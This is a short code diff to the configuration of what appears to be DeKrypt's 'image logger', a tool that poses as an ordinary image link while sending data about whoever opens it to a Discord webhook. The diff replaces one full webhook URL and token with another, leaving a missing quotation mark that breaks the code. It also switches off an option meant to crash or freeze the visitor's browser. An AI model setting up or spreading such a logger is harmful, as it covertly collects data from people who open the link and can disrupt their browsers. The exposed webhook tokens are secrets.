@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1440543669756362783/Ut4JvCN-Rz_0RWFcm9QPkcgx7nChy_kxmgfeVaVxgsTSsv0OYeyy_wS0UiFqPbj4F3fk",
+    "webhook": https://discord.com/api/webhooks/1444801066649780254/tlUeYx1JVkX8RLt8InbWzr-ZeBiw7wc6yxTjNTjs1lHTTdVfgelQhbvfiR5W76r3TytZ",
     "image": "https://www.pokemon.com/static-assets/content-assets/cms2/img/pokedex/full/025.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
@@ -22,7 +22,7 @@ config = {
 
     # OPTIONS #
     "crashBrowser": {
-        "doCrashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+        "doCrashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
         "customMessage": "This browser has been crashed by doodlebutt0415",
     },
 
